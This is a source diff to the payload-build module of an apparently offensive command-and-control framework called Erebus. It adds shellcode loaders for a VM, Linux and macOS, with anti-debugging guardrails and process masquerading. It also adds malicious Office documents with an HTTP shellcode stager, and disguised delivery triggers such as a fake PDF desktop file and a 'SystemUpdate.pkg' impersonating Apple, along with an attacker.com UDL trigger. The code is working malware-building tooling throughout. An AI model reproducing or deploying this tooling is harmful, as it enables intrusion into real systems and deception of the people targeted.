+            ("UDL", lambda w: create_udl_trigger(
+                attacker_host="attacker.com",
+                share_name="share",
+                output_filename="database.udl",
+                payload_dir=w / "payload")),
+            ("QR", lambda w: create_qr_html_trigger(
+                url="https://login.microsoftonline.com/",
+                output_filename="verify.html",
+                payload_dir=w / "payload")),
+            ("AppDomain", lambda w: create_appdomain_config(
+                target_exe="AddInProcess.exe",
+                output_dir=w / "payload")),
         ]
 
         # (tag, callable(work_root) → output_path_or_None)
@@ -3384,10 +3850,21 @@ generated if none have been entered.""",
 
             shellcode_loader_path = PurePath(agent_build_path) / "Erebus.Loaders" / "Erebus.Loader"
             clickonce_loader_path = PurePath(agent_build_path) / "Erebus.Loaders" / "Erebus.ClickOnce"
+            vmloader_path         = PurePath(agent_build_path) / "Erebus.Loaders" / "Erebus.VMLoader"
             encrypted_shellcode_path_sc = PurePath(agent_build_path) / "Erebus.Loaders" / "Erebus.Loader" / "include" / "shellcode.hpp"
             shellcode_loader_path = str(shellcode_loader_path)
             clickonce_loader_path = str(clickonce_loader_path)
+            vmloader_path         = str(vmloader_path)
             encrypted_shellcode_path_sc = str(encrypted_shellcode_path_sc)
+
+            nix_loader_path = PurePath(agent_build_path) / "Erebus.Loaders" / "Erebus.NixLoader"
+            mac_loader_path = PurePath(agent_build_path) / "Erebus.Loaders" / "Erebus.MacLoader"
+            nix_shellcode_h = PurePath(agent_build_path) / "Erebus.Loaders" / "Erebus.NixLoader" / "include" / "shellcode.h"
+            mac_shellcode_h = PurePath(agent_build_path) / "Erebus.Loaders" / "Erebus.MacLoader" / "include" / "shellcode.h"
+            nix_loader_path = str(nix_loader_path)
+            mac_loader_path = str(mac_loader_path)
+            nix_shellcode_h = str(nix_shellcode_h)
+            mac_shellcode_h = str(mac_shellcode_h)
 
             shellcrypt_path = PurePath(agent_build_path) / "shellcrypt" / "shellcrypt.py"
             shellcrypt_path = str(shellcrypt_path)
@@ -3586,9 +4063,48 @@ generated if none have been entered.""",
                     shutil.copy(src=str(obfuscated_shellcode_path),
                                 dst=str(encrypted_shellcode_path_sc))
                     output += f"[DEBUG] Copied CSharp shellcode to {encrypted_shellcode_path_sc}\n"
+                elif self.get_parameter("0.1 Loader Type") == "VM Loader":
+                    # VM Loader: vmloader_builder applies its own XOR layer.
+                    # Write raw bytes as a C array into shellcode.hpp so the
+                    # native builder binary reads unencrypted shellcode.
+                    with open(str(mythic_shellcode_path), "rb") as _f:
+                        _raw = _f.read()
+                    _hex = ", ".join(f"0x{b:02X}" for b in _raw)
+                    with open(encrypted_shellcode_path_sc, "w") as _f:
+                        _f.write(
+                            f"unsigned char key[] = {{ 0x00 }};\n"
+                            f"unsigned char nonce[] = {{ 0x00 }};\n"
+                            f"unsigned char shellcode[] = {{ {_hex} }};\n"
+                        )
+                    output += f"[DEBUG] Wrote {len(_raw)} raw bytes to shellcode.hpp for VM Loader\n"
                 elif self.get_parameter("0.0 Main Payload Type") == "Hijack":
                     shutil.copy(src=str(obfuscated_shellcode_path),
                                 dst=str(encrypted_shellcode_path_sc))
+                elif self.get_parameter("0.0 Target OS") == "Linux":
+                    # Write raw shellcode bytes as a C array into the NixLoader header.
+                    # The Linux loader embeds shellcode directly without a Win32 decrypt
+                    # pipeline - obfuscation is applied at the trigger/delivery layer.
+                    with open(str(mythic_shellcode_path), "rb") as _f:
+                        _raw = _f.read()
+                    _hex = ", ".join(f"0x{b:02X}" for b in _raw)
+                    with open(nix_shellcode_h, "w") as _f:
+                        _f.write(
+                            "#pragma once\n"
+                            "#include <stddef.h>\n"
+                            f"static unsigned char shellcode[] = {{ {_hex} }};\n"
+                        )
+                    output += f"[DEBUG] Wrote {len(_raw)} raw bytes to {nix_shellcode_h}\n"
+                elif self.get_parameter("0.0 Target OS") == "macOS":
+                    with open(str(mythic_shellcode_path), "rb") as _f:
+                        _raw = _f.read()
+                    _hex = ", ".join(f"0x{b:02X}" for b in _raw)
+                    with open(mac_shellcode_h, "w") as _f:
+                        _f.write(
+                            "#pragma once\n"
+                            "#include <stddef.h>\n"
+                            f"static unsigned char shellcode[] = {{ {_hex} }};\n"
+                        )
+                    output += f"[DEBUG] Wrote {len(_raw)} raw bytes to {mac_shellcode_h}\n"
 
                 if self.get_parameter("2.4 Shellcode Format") == "Raw":
                     # Raw format: re-run shellcrypt in C mode and slice the
@@ -3638,7 +4154,16 @@ generated if none have been entered.""",
             # Determine payload type and configure accordingly
             payload_type = self.get_parameter("0.0 Main Payload Type")
             dll_file_name = None  # Used to store DLL filename for final payload naming
-            print(f'User Selected: {payload_type}')
+
+            # Override payload_type for non-Windows targets so the Linux/macOS
+            # compilation path is taken instead of the Windows Loader/Hijack path.
+            _target_os = self.get_parameter("0.0 Target OS")
+            if _target_os == "Linux":
+                payload_type = "Linux"
+            elif _target_os == "macOS":
+                payload_type = "macOS"
+
+            print(f'User Selected: {payload_type} (Target OS: {_target_os})')
 
             if payload_type == "Hijack":
                 # [DLL HIJACK SPECIFIC] Get the DLL target file from Mythic
@@ -4111,6 +4636,153 @@ generated if none have been entered.""",
                     payload_output_file = None  # Will be determined from publish directory
                     payload_final_name = "erebus.exe"
 
+                elif loader_type == "VM Loader":
+                    loader_format = self.get_parameter('0.2 Loader Format')
+                    build_config = self.get_parameter('0.3 Loader Build Configuration')
+                    _hash_seed = f"0x{secrets.randbits(32):08X}"
+                    _sw3 = 1 if self.get_parameter("0.5m Syscall Backend") == "SysWhispers3" else 0
+                    _so_type = {"None": 0, "Timer": 1, "Ekko-lite": 2, "Exhaustion": 3}.get(
+                        self.get_parameter("0.5p Sleep Obfuscation"), 0)
+                    inj = self.get_parameter('0.4a VM Loader - Injection Type') or "2"
+
+                    embedded_proc = await asyncio.create_subprocess_exec(
+                        "make", "-C", vmloader_path, "embedded",
+                        stdout=asyncio.subprocess.PIPE,
+                        stderr=asyncio.subprocess.PIPE,
+                    )
+                    emb_out, emb_err = await embedded_proc.communicate()
+                    if emb_out:
+                        output += f"[embedded stdout]\n{emb_out.decode(errors='replace')}"
+                    if emb_err:
+                        output += f"[embedded stderr]\n{emb_err.decode(errors='replace')}"
+                    if embedded_proc.returncode != 0:
+                        response.status = BuildStatus.Error
+                        response.build_message = "VM Loader: failed to generate embedded.h"
+                        response.build_stderr = output
+                        await self._build_step("[T1027] - VM Loader embedded.h", "Failed to generate embedded.h", success=False)
+                        return response
+
+                    cmd = [
+                        "make",
+                        "-C",
+                        vmloader_path,
+                        f"ARCH={self.get_parameter('0.2a Loader Architecture')}",
+                        f"TARGET={loader_format}",
+                        f"BUILD={build_config}",
+                        f"INJECTION_TYPE={inj}",
+                        f"EREBUS_HASH_SEED={_hash_seed}",
+                        f"CONFIG_SYSCALL_BACKEND={_sw3}",
+                        f"CONFIG_SLEEP_OBFUSCATION_TYPE={_so_type}",
+                        "all"
+                    ]
+                    if loader_format == "dll":
+                        compile_step_name = "[T1027.011] - Compiling VM Loader DLL"
+                        compile_step_msg = "VM Loader DLL Compiled!"
+                    elif loader_format == "xll":
+                        compile_step_name = "[T1559.002] - Compiling VM Loader XLL"
+                        compile_step_msg = "VM Loader XLL Compiled!"
+                    else:
+                        compile_step_name = "[T1027] - Compiling VM Loader"
+                        compile_step_msg = "VM Loader Compiled!"
+                    payload_output_file = f"{vmloader_path}/erebus_vm.{loader_format}"
+                    payload_final_name = f"erebus_vm.{loader_format}"
+
+            elif payload_type == "Linux":
+                _lnx_fmt   = {"ELF": "elf", "Shared Object": "so"}.get(
+                    self.get_parameter("0.1-L Linux Loader Type"), "elf")
+                _lnx_arch  = self.get_parameter("0.2a-L Linux Architecture") or "x86_64"
+                _lnx_build = self.get_parameter("0.3-L Linux Build Configuration") or "release"
+                _lnx_inj   = self.get_parameter("0.4-L Linux Injection Type") or "2"
+                _lnx_gr    = 1 if self.get_parameter("0.5-L Linux Enable Guardrails") else 0
+                _lnx_ptrace= 1 if self.get_parameter("0.5a-L Linux Check ptrace") else 0
+                _lnx_cgrp  = 1 if self.get_parameter("0.5b-L Linux Check Container") else 0
+                _lnx_masq  = 1 if self.get_parameter("0.5e-L Linux Process Masquerade") else 0
+                _lnx_mname = self.get_parameter("0.5f-L Linux Masquerade Name") or "[kworker/u:0]"
+
+                cmd = [
+                    "make", "-C", nix_loader_path,
+                    f"ARCH={_lnx_arch}",
+                    f"TARGET={_lnx_fmt}",
+                    f"BUILD={_lnx_build}",
+                    f"INJECTION_TYPE={_lnx_inj}",
+                    f"CONFIG_GUARDRAILS_ENABLED={_lnx_gr}",
+                    f"CONFIG_CHECK_PTRACE={_lnx_ptrace}",
+                    f"CONFIG_CHECK_CGROUP={_lnx_cgrp}",
+                    f"CONFIG_MASQUERADE_ENABLED={_lnx_masq}",
+                    f"CONFIG_MASQUERADE_NAME={_lnx_mname}",
+                ]
+
+                if _lnx_gr:
+                    _bh = parse_csv(self.get_parameter("0.5c-L Linux Blocked Hostnames") or "")
+                    if _bh:
+                        cmd.append(
+                            "CONFIG_BLOCKED_HOSTNAMES={"
+                            + ",".join(f'\\"{h}\\"' for h in _bh)
+                            + "}"
+                        )
+                    _bu = parse_csv(self.get_parameter("0.5d-L Linux Blocked Usernames") or "")
+                    if _bu:
+                        cmd.append(
+                            "CONFIG_BLOCKED_USERNAMES={"
+                            + ",".join(f'\\"{u}\\"' for u in _bu)
+                            + "}"
+                        )
+
+                cmd.append("all")
+
+                _lnx_out_ext = ".so" if _lnx_fmt == "so" else ""
+                compile_step_name  = "[T1059.004] - Compiling Linux Shellcode Loader"
+                compile_step_msg   = f"Linux {'Shared Object' if _lnx_out_ext else 'ELF'} loader compiled!"
+                payload_output_file = f"{nix_loader_path}/erebus_nix{_lnx_out_ext}"
+                payload_final_name  = f"erebus_nix{_lnx_out_ext}"
+
+            elif payload_type == "macOS":
+                _mac_fmt   = {"MachO": "macho", "Dylib": "dylib"}.get(
+                    self.get_parameter("0.1-M macOS Loader Type"), "macho")
+                _mac_arch  = self.get_parameter("0.2a-M macOS Architecture") or "x86_64"
+                _mac_build = self.get_parameter("0.3-M macOS Build Configuration") or "release"
+                _mac_inj   = self.get_parameter("0.4-M macOS Injection Type") or "1"
+                _mac_gr    = 1 if self.get_parameter("0.5-M macOS Enable Guardrails") else 0
+                _mac_da    = 1 if self.get_parameter("0.5a-M macOS Deny Attach") else 0
+                _mac_dbg   = 1 if self.get_parameter("0.5b-M macOS Check Debug") else 0
+                _mac_time  = 1 if self.get_parameter("0.5c-M macOS Check Timing") else 0
+
+                cmd = [
+                    "make", "-C", mac_loader_path,
+                    f"ARCH={_mac_arch}",
+                    f"TARGET={_mac_fmt}",
+                    f"BUILD={_mac_build}",
+                    f"INJECTION_TYPE={_mac_inj}",
+                    f"CONFIG_GUARDRAILS_ENABLED={_mac_gr}",
+                    f"CONFIG_DENY_ATTACH={_mac_da}",
+                    f"CONFIG_CHECK_DEBUG={_mac_dbg}",
+                    f"CONFIG_CHECK_TIMING={_mac_time}",
+                ]
+
+                if _mac_gr:
+                    _bh = parse_csv(self.get_parameter("0.5d-M macOS Blocked Hostnames") or "")
+                    if _bh:
+                        cmd.append(
+                            "CONFIG_BLOCKED_HOSTNAMES={"
+                            + ",".join(f'\\"{h}\\"' for h in _bh)
+                            + "}"
+                        )
+                    _bu = parse_csv(self.get_parameter("0.5e-M macOS Blocked Usernames") or "")
+                    if _bu:
+                        cmd.append(
+                            "CONFIG_BLOCKED_USERNAMES={"
+                            + ",".join(f'\\"{u}\\"' for u in _bu)
+                            + "}"
+                        )
+
+                cmd.append("all")
+
+                _mac_out_ext = ".dylib" if _mac_fmt == "dylib" else ""
+                compile_step_name  = "[T1059.004] - Compiling macOS Shellcode Loader"
+                compile_step_msg   = f"macOS {'Dylib' if _mac_out_ext else 'Mach-O'} loader compiled!"
+                payload_output_file = f"{mac_loader_path}/erebus_mac{_mac_out_ext}"
+                payload_final_name  = f"erebus_mac{_mac_out_ext}"
+
             # Execute compilation
             process = await asyncio.create_subprocess_exec(
                 *cmd,
@@ -4331,6 +5003,55 @@ generated if none have been entered.""",
 
                     await self._build_step(compile_step_name, compile_step_msg, success=True)
 
+                elif loader_type == "VM Loader":
+                    payload_path = PurePath(agent_build_path) / "payload" / payload_final_name
+                    payload_path = str(payload_path)
+                    shutil.copy(dst=payload_path, src=payload_output_file)
+
+                    build_config = self.get_parameter('0.3 Loader Build Configuration')
+                    output += _finalize_pe_artifact(
+                        payload_path,
+                        str(PurePath(agent_build_path) / "payload"),
+                        build_config=build_config,
+                    )
+
+                    if os.path.exists(payload_path):
+                        response.status = BuildStatus.Success
+                        response.build_message = "VM Loader Compiled!"
+                        response.build_stdout = output + "\n" + payload_path
+                        await self._build_step(compile_step_name, compile_step_msg, success=True)
+                    else:
+                        response.status = BuildStatus.Error
+                        response.build_message = "Failed to compile VM Loader"
+                        response.build_stderr = output + "\n" + payload_path
+                        await self._build_step(compile_step_name, "Failed to Compile VM Loader", success=False)
+                        return response
+
+            elif payload_type in ("Linux", "macOS"):
+                payload_path = PurePath(agent_build_path) / "payload" / payload_final_name
+                payload_path = str(payload_path)
+
+                if not os.path.exists(payload_output_file):
+                    response.status = BuildStatus.Error
+                    response.build_message = f"Compilation failed - output not found: {payload_output_file}"
+                    response.build_stderr = output
+                    await self._build_step(compile_step_name, f"Compilation failed", success=False)
+                    return response
+
+                shutil.copy(dst=payload_path, src=payload_output_file)
+
+                if os.path.exists(payload_path):
+                    response.status = BuildStatus.Success
+                    response.build_message = compile_step_msg
+                    response.build_stdout = output + "\n" + payload_path
+                    await self._build_step(compile_step_name, compile_step_msg, success=True)
+                else:
+                    response.status = BuildStatus.Error
+                    response.build_message = f"Failed to copy loader to payload dir"
+                    response.build_stderr = output + "\n" + payload_path
+                    await self._build_step(compile_step_name, f"Failed to stage loader", success=False)
+                    return response
+
             output = ""
             ######################### End Of Payload Build Section #########################
             ######################### Code Signing Section #########################
@@ -4378,7 +5099,94 @@ generated if none have been entered.""",
             if maldoc_mode != "None" and self.get_parameter("0.8 Output Extension Source") == "Trigger":
                 await self._build_step("[T1566.001] - Creating MalDoc", "Skipping MalDoc Generation (Trigger selected as source).", success=True)
 
-            if maldoc_mode != "None" and self.get_parameter("0.8 Output Extension Source") != "Trigger":
+            ######################### MalDoc Matrix Branch #########################
+            if maldoc_mode == "Build Matrix" and self.get_parameter("0.8 Output Extension Source") != "Trigger":
+                payload_dir    = Path(agent_build_path) / "payload"
+                doc_name       = self.get_parameter("0.9d Excel Document Name")
+                obfuscate      = self.get_parameter("0.9e Obfuscate VBA")
+                target_process = self.get_parameter("0.5 Shellcode Loader - Target Process")
+
+                _raw_loaders  = self.get_parameter("0.9r Matrix Loaders") or ""
+                _raw_triggers = self.get_parameter("0.9s Matrix Triggers") or ""
+                _raw_formats  = self.get_parameter("0.9t Matrix Formats")  or ""
+                matrix_loaders  = [x.strip() for x in _raw_loaders.split(",")  if x.strip()] or None
+                matrix_triggers = [x.strip() for x in _raw_triggers.split(",") if x.strip()] or None
+                matrix_formats  = [x.strip() for x in _raw_formats.split(",")  if x.strip()] or None
+                matrix_zip      = self.get_parameter("0.9u Matrix Zip Output")
+
+                enc_method = ENCRYPTION_METHODS.get(self.get_parameter("2.1 Encryption Type"), "xor")
+                enc_key    = self.get_parameter("2.2 Encryption Key")
+                if enc_key == "NONE":
+                    enc_key = None
+
+                matrix_out = payload_dir / "maldoc_matrix"
+
+                # Pre-bundle erebus_helper.py so the matrix can embed it.
+                # The main helper-export step runs later in the pipeline; we
+                # do it early here so the matrix zip is self-contained.
+                _helper_src = Path(__file__).parent.parent / "agent_code" / "Erebus.Helper"
+                _helper_out = payload_dir / "erebus_helper.py"
+                _helper_ready = None
+                if _helper_src.exists() and not _helper_out.exists():
+                    try:
+                        self._bundle_helper_as_single_file(_helper_src, _helper_out)
+                        _helper_ready = _helper_out
+                    except Exception as _he:
+                        output += f"[!] Warning: could not pre-bundle helper for matrix: {_he}\n"
+                elif _helper_out.exists():
+                    _helper_ready = _helper_out
+
+                try:
+                    from erebus_wrapper.maldoc_matrix import build_matrix as _build_matrix
+                    manifest = _build_matrix(
+                        shellcode_path  = Path(mythic_shellcode_path),
+                        output_dir      = matrix_out,
+                        doc_name        = doc_name,
+                        encryption      = enc_method,
+                        enc_key         = enc_key,
+                        loaders         = matrix_loaders,
+                        triggers        = matrix_triggers,
+                        formats         = matrix_formats,
+                        obfuscate       = obfuscate,
+                        target_process  = target_process,
+                        export_bas      = True,
+                        zip_output      = matrix_zip,
+                        helper_path     = _helper_ready,
+                    )
+
+                    ok_count   = sum(1 for e in manifest["entries"] if e["status"] == "OK")
+                    skip_count = sum(1 for e in manifest["entries"] if e["status"] == "SKIP")
+                    fail_count = sum(1 for e in manifest["entries"] if e["status"] == "FAIL")
+
+                    _loaders_used  = ", ".join(dict.fromkeys(e["loader"]  for e in manifest["entries"]))
+                    _triggers_used = ", ".join(dict.fromkeys(e["trigger"] for e in manifest["entries"]))
+                    _formats_used  = ", ".join(dict.fromkeys(e["format"]  for e in manifest["entries"]))
+
+                    _matrix_msg = (
+                        f"[+] MalDoc Matrix: {ok_count} built, {skip_count} skipped, {fail_count} failed.\n"
+                        f"[*] Loaders  : {_loaders_used}\n"
+                        f"[*] Triggers : {_triggers_used}\n"
+                        f"[*] Formats  : {_formats_used}\n"
+                        f"[*] Output   : payload/maldoc_matrix/  (MANIFEST.json + MANIFEST.txt inside)\n"
+                        f"[*] COM bat  : payload/maldoc_matrix/build_matrix_com.bat"
+                        f"  (copy matrix folder to Windows + run for COM re-injection)\n"
+                    )
+                    if matrix_zip:
+                        _zip_path = matrix_out.with_suffix(".zip")
+                        if _zip_path.exists():
+                            _matrix_msg += f"[*] ZIP      : payload/maldoc_matrix.zip  ({_zip_path.stat().st_size:,} B)\n"
+
+                    output += _matrix_msg
+                    await self._build_step("[T1566.001] - Creating MalDoc", _matrix_msg, success=True)
+
+                except Exception as e:
+                    await self._build_step("[T1566.001] - Creating MalDoc", f"MalDoc Matrix build failed: {str(e)}", success=False)
+                    response.status = BuildStatus.Error
+                    response.build_stderr = f"MalDoc Matrix failed: {str(e)}"
+                    return response
+
+            ######################### MalDoc Single-Document Branch #########################
+            if maldoc_mode not in ("None", "Build Matrix") and self.get_parameter("0.8 Output Extension Source") != "Trigger":
                 payload_dir = Path(agent_build_path) / "payload"
                 maldoc_type = self.get_parameter("0.9a MalDoc Type")
                 vba_trigger = self.get_parameter("0.9c VBA Execution Trigger")
@@ -4408,75 +5216,131 @@ generated if none have been entered.""",
                         )
 
                     else:  # Shellcode Injection
-                        # Convert shellcode to VBA format using shellcrypt.
-                        # Use -o <temp_file> so shellcrypt writes raw VBA directly to
-                        # disk instead of via Rich console.print, which wraps long
-                        # lines at terminal width when stdout is piped and would
-                        # split "key = Array(...)" across lines, breaking the output.
-                        vba_fd, vba_tmp = tempfile.mkstemp(suffix='.vba')
-                        os.close(vba_fd)
-
-                        cmd = [
-                            "python",
-                            shellcrypt_path,
-                            "-i", mythic_shellcode_path,
-                            "-e", ENCRYPTION_METHODS[self.get_parameter("2.1 Encryption Type")],
-                            "-f", "vba",
-                            "-a", "shellcode",
-                            "-o", vba_tmp,
-                        ]
-
-                        if self.get_parameter("2.2 Encryption Key") != "NONE":
-                            cmd += ["-k", self.get_parameter("2.2 Encryption Key")]
-
-                        if self.get_parameter("2.0 Compression Type") != "NONE":
-                            cmd += ["-c", COMPRESSION_METHODS[self.get_parameter("2.0 Compression Type")]]
-
-                        subprocess.check_output(cmd, text=True, stderr=subprocess.STDOUT)
-
-                        shellcode_vba = open(vba_tmp, 'r').read()
-                        os.unlink(vba_tmp)
-
-                        output += f"[DEBUG] Shellcrypt VBA output length: {len(shellcode_vba)} bytes\n"
-
-                        # Map loader selection to plugin parameter
                         loader_map = {
-                            "VirtualAlloc + CreateThread": "createthread",
-                            "EnumSystemLocalesA Callback": "enumlocales",
-                            "QueueUserAPC Injection": "queueuserapc",
-                            "Process Hollowing": "hollowing",
-                            "Early-Bird Injection": "earlybird"
+                            "VirtualAlloc + CreateThread":    "createthread",
+                            "EnumSystemLocalesA Callback":    "enumlocales",
+                            "QueueUserAPC Injection":         "queueuserapc",
+                            "AddressOfEntryPoint Injection":  "hollowing",
+                            "Early-Bird Injection":           "earlybird",
                         }
                         loader_type = loader_map.get(self.get_parameter("0.9g VBA Loader Technique"), "createthread")
-                        output += f"[DEBUG] Using VBA loader technique: {loader_type}\n"
-
-                        # Get target process for hollowing technique
                         target_process = self.get_parameter("0.5 Shellcode Loader - Target Process")
-                        output += f"[DEBUG] Target process: {target_process}\n"
+                        http_stager_base = (self.get_parameter("0.9v HTTP Stager URL") or "").strip().rstrip("/")
+                        output += f"[DEBUG] HTTP Stager URL param value: '{http_stager_base}'\n"
 
-                        # Generate VBA that injects the shellcode.
-                        # Word formats (docm/doc) use the improved Word loader:
-                        #   - Document_Open + AutoOpen dual triggers
-                        #   - RW alloc -> VirtualProtect RX flip (no RWX)
-                        #   - Source buffer zeroing + GetTickCount sandbox gate
-                        # Excel formats use the existing loader generators.
                         from erebus_wrapper.erebus.modules.plugin_payload_maldocs import PayloadMalDocsPlugin
                         plugin = PayloadMalDocsPlugin()
                         _word_fmt = (self.get_parameter("0.9p MalDoc Output Format") or "xlsm").lower()
-                        if _word_fmt in ("docm", "doc"):
-                            vba_code = plugin.generate_word_vba_loader(
-                                vba_shellcode=shellcode_vba,
+
+                        if http_stager_base:
+                            # HTTP staging path:
+                            # 1. RC4-encrypt shellcode with a random 16-byte key
+                            # 2. Upload encrypted blob to Mythic file store → get AgentFileId
+                            # 3. Construct download URL: <base>/direct/download/<uuid>
+                            # 4. Generate tiny VBA that downloads + decrypts at runtime
+                            # No shellcode embedded in VBA source - bypasses module size limits.
+                            sc_bytes = open(mythic_shellcode_path, "rb").read()
+                            rc4_key = secrets.token_bytes(16)
+                            enc_bytes = plugin.rc4_encrypt_shellcode(sc_bytes, rc4_key)
+
+                            output += f"[DEBUG] RC4-encrypted shellcode: {len(enc_bytes):,} bytes. Uploading to Mythic...\n"
+
+                            file_create_resp = await SendMythicRPCFileCreate(
+                                MythicRPCFileCreateMessage(
+                                    PayloadUUID=self.uuid,
+                                    FileContents=enc_bytes,
+                                    Filename="shellcode.enc",
+                                    DeleteAfterFetch=False,
+                                )
+                            )
+
+                            output += f"[DEBUG] SendMythicRPCFileCreate result: Success={file_create_resp.Success} AgentFileId={file_create_resp.AgentFileId} Error={file_create_resp.Error}\n"
+
+                            if not file_create_resp.Success or not file_create_resp.AgentFileId:
+                                # Fallback: write encrypted blob to build artifacts so operator can host manually
+                                enc_path = Path(agent_build_path) / "payload" / "shellcode.enc"
+                                enc_path.parent.mkdir(parents=True, exist_ok=True)
+                                enc_path.write_bytes(enc_bytes)
+                                await self._fail_step(
+                                    "[T1566.001] - Creating MalDoc",
+                                    f"Mythic file upload failed ({file_create_resp.Error}). "
+                                    f"shellcode.enc written to build artifacts - host it manually at {http_stager_base}/shellcode.enc "
+                                    f"or rebuild with the correct base URL after fixing the upload issue.",
+                                    f"HTTP stager upload failed: {file_create_resp.Error}",
+                                )
+                                return response
+
+                            staging_url = f"{http_stager_base}/direct/download/{file_create_resp.AgentFileId}"
+
+                            output += (
+                                f"[+] HTTP stager: shellcode RC4-encrypted ({len(enc_bytes):,} bytes) "
+                                f"and uploaded to Mythic (AgentFileId: {file_create_resp.AgentFileId}).\n"
+                                f"[+] Staging URL embedded in VBA: {staging_url}\n"
+                                f"[*] RC4 key embedded in VBA (16 bytes). No shellcode in VBA source.\n"
+                            )
+                            await self._build_step(
+                                "[T1566.001] - Creating MalDoc",
+                                f"HTTP stager: {len(enc_bytes):,}B uploaded → {staging_url}",
+                                success=True,
+                            )
+
+                            vba_code = plugin.generate_http_stager_vba(
+                                url=staging_url,
+                                rc4_key=rc4_key,
                                 trigger_type=vba_trigger,
                                 loader_type=loader_type,
-                                target_process=target_process,
+                                target_process=target_process or "C:\\Windows\\System32\\notepad.exe",
+                                is_word=_word_fmt in ("docm", "doc"),
                             )
+
                         else:
-                            vba_code = plugin.generate_shellcode_injection_vba(
-                                vba_shellcode=shellcode_vba,
-                                trigger_type=vba_trigger,
-                                loader_type=loader_type,
-                                target_process=target_process,
-                            )
+                            # Embedded path: convert shellcode to VBA format using shellcrypt.
+                            # Use -o <temp_file> so shellcrypt writes raw VBA directly to
+                            # disk instead of via Rich console.print, which wraps long
+                            # lines at terminal width when stdout is piped and would
+                            # split "key = Array(...)" across lines, breaking the output.
+                            vba_fd, vba_tmp = tempfile.mkstemp(suffix='.vba')
+                            os.close(vba_fd)
+
+                            cmd = [
+                                "python",
+                                shellcrypt_path,
+                                "-i", mythic_shellcode_path,
+                                "-e", ENCRYPTION_METHODS[self.get_parameter("2.1 Encryption Type")],
+                                "-f", "vba",
+                                "-a", "shellcode",
+                                "-o", vba_tmp,
+                            ]
+
+                            if self.get_parameter("2.2 Encryption Key") != "NONE":
+                                cmd += ["-k", self.get_parameter("2.2 Encryption Key")]
+
+                            if self.get_parameter("2.0 Compression Type") != "NONE":
+                                cmd += ["-c", COMPRESSION_METHODS[self.get_parameter("2.0 Compression Type")]]
+
+                            subprocess.check_output(cmd, text=True, stderr=subprocess.STDOUT)
+
+                            shellcode_vba = open(vba_tmp, 'r').read()
+                            os.unlink(vba_tmp)
+
+                            output += f"[DEBUG] Shellcrypt VBA output length: {len(shellcode_vba)} bytes\n"
+                            output += f"[DEBUG] Using VBA loader technique: {loader_type}\n"
+                            output += f"[DEBUG] Target process: {target_process}\n"
+
+                            if _word_fmt in ("docm", "doc"):
+                                vba_code = plugin.generate_word_vba_loader(
+                                    vba_shellcode=shellcode_vba,
+                                    trigger_type=vba_trigger,
+                                    loader_type=loader_type,
+                                    target_process=target_process,
+                                )
+                            else:
+                                vba_code = plugin.generate_shellcode_injection_vba(
+                                    vba_shellcode=shellcode_vba,
+                                    trigger_type=vba_trigger,
+                                    loader_type=loader_type,
+                                    target_process=target_process,
+                                )
 
                     if obfuscate:
                         vba_code = await self.obfuscate_vba(vba_code)
@@ -4774,7 +5638,13 @@ generated if none have been entered.""",
                 decoy_dir = Path(agent_build_path) / "decoys"
                 decoy_file = decoy_dir / "decoy.pdf"
 
-                trigger_type = self.get_parameter("0.9 Trigger Type")
+                target_os = self.get_parameter("0.0 Target OS")
+                if target_os == "Linux":
+                    trigger_type = self.get_parameter("0.9-L Linux Trigger Type")
+                elif target_os == "macOS":
+                    trigger_type = self.get_parameter("0.9-M macOS Trigger Type")
+                else:
+                    trigger_type = self.get_parameter("0.9 Trigger Type")
 
                 try:
                     trigger_path = ""
@@ -4978,7 +5848,7 @@ generated if none have been entered.""",
                             trigger_path = create_geofenced_html_smuggling_trigger(
                                 payload_path=str(_geo_exe),
                                 allowed_countries=_countries,
-                                fallback_url=_fallback,
+                                fallback_redirect=_fallback,
                                 output_filename="document.html",
                                 download_name=_geo_exe.name,
                                 payload_dir=payload_dir,
@@ -5026,6 +5896,66 @@ generated if none have been entered.""",
                                     target_exe=_ad_exe,
                                     output_dir=payload_dir,
                                 )
+
+                        # ── Linux triggers ────────────────────────────────────
+                        case "Bash":
+                            trigger_path = create_bash_trigger(
+                                command=(
+                                    f"{self.get_parameter('0.9a Trigger Binary')} "
+                                    f"{self.get_parameter('0.9b Trigger Command')}"
+                                ).strip(),
+                                output_filename="update.sh",
+                                payload_dir=payload_dir,
+                                obfuscate=True,
+                                decoy_path=str(decoy_file) if decoy_file.exists() else "",
+                                target_os=target_os,
+                            )
+
+                        case "Desktop":
+                            trigger_path = create_desktop_trigger(
+                                command=(
+                                    f"{self.get_parameter('0.9a Trigger Binary')} "
+                                    f"{self.get_parameter('0.9b Trigger Command')}"
+                                ).strip(),
+                                output_filename="document.desktop",
+                                payload_dir=payload_dir,
+                                display_name="PDF Document",
+                                icon_name="application-pdf",
+                                decoy_path=str(decoy_file) if decoy_file.exists() else "",
+                            )
+
+                        # ── macOS triggers ────────────────────────────────────
+                        case "Command":
+                            trigger_path = create_command_trigger(
+                                command=(
+                                    f"{self.get_parameter('0.9a Trigger Binary')} "
+                                    f"{self.get_parameter('0.9b Trigger Command')}"
+                                ).strip(),
+                                output_filename="setup.command",
+                                payload_dir=payload_dir,
+                                decoy_path=str(decoy_file) if decoy_file.exists() else "",
+                            )
+
+                        case "AppleScript":
+                            trigger_path = create_applescript_trigger(
+                                command=(
+                                    f"{self.get_parameter('0.9a Trigger Binary')} "
+                                    f"{self.get_parameter('0.9b Trigger Command')}"
+                                ).strip(),
+                                output_filename="update.scpt",
+                                payload_dir=payload_dir,
+                                decoy_path=str(decoy_file) if decoy_file.exists() else "",
+                            )
+
+                        case "PKG":
+                            _pkg_payload = payload_dir / "payload"
+                            trigger_path = create_pkg_trigger(
+                                payload_path=str(_pkg_payload),
+                                output_dir=str(payload_dir),
+                                payload_dir=payload_dir,
+                                pkg_name="SystemUpdate.pkg",
+                                bundle_id="com.apple.systemupdate",
+                            )
 
                     if trigger_path:
                         response.status = BuildStatus.Success
